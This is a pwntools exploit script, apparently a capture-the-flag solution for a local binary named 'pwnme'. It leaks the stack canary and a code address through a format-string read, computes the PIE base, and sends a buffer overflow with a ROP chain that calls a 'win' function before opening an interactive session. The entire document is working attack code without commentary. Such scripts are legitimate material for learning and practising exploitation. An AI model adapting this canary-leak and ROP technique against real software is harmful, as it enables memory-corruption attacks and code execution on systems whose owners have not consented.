from pwn import *

elf = context.binary = ELF("./pwnme")
p = process()

p.sendlineafter(b'?', b'%13$016lx %15$016lx')
canary, leak = [int(x, 16) for x in p.recv(33).split()]
info("Canary = %s", hex(canary))
info("Leak = %s", hex(leak))

elf.address = leak - (elf.symbols.main + 28)
rop = ROP(elf)

payload = flat(
    cyclic(24),
    canary,
    cyclic(8),
    rop.rdi.address,
    0xdeadbeef,
    rop.ret.address,
    elf.symbols.win 
)

p.sendline(payload)
p.interactive()

